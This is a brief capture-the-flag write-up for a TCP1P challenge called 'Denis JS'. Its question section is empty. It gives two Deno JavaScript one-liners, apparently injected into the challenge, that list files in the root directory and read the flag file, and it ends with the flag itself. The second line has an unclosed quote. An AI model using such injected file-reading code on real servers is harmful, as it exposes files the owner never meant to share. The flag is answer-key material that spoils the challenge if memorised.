# Denis JS

Solved by: @arifpeycal 

## Question:


## Solution:
1. `console.log([...Deno.readDirSync("/")].filter(f => f.name.startsWith("flag-")).map(f => f.name))` to get the flag name
2. `console.log(new TextDecoder().decode(Deno.readFileSync("/flag-<id>)));`

**Flag:** `TCP1P{hope_nagi_didnt_see_i_use_his_payload_to_solve_this_challenge}`
